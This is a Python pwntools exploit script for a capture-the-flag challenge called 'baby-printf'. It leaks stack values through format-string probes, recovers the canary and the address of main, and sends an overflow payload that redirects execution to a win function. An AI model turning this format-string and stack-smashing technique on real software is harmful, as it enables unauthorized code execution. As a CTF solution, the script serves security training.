#!/bin/python3

import os
from pwn import *
import logging
logging.disable()

HOST = os.environ.get("HOST", "baby-printf.challs.olicyber.it")
PORT = int(os.environ.get("PORT", 34004))

io = remote(HOST, PORT)

mem = [b""] * 100

io.recvuntil(b"back:")
for i in range(100):
    io.sendline(f"%{i}$p".encode())
    mem[i] = io.recvline()

cs = mem[12]
canary = eval(cs)

ms = mem[16]
main = eval(ms)
win = main - 54

log.success(f"canary: {hex(canary)}")
log.success(f"main: {hex(main)}")
log.success(f"win: {hex(win)}")

io.sendline(fit({
    32: p64(canary)*2 + p64(win) * 3
}))

io.sendline(b"!q")

f = io.recvline()
f += io.recvline(timeout=0.1)
f += io.recvline(timeout=0.1)
